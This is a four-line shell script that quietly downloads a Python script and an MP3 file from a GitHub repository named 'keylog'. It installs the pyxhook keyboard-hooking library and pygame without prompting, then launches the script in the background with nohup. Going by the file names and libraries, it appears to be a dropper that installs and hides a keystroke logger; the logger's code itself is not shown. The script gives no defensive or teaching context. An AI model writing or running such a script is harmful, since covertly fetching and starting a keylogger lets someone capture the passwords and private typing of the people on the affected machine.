wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/KEYLOG_log.py"
wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/KEYLOG_music.mp3"
yes | pip3 install pyxhook pygame 
nohup python3 KEYLOG_log.py > KEYLOG_script_out.log 2>&1 &
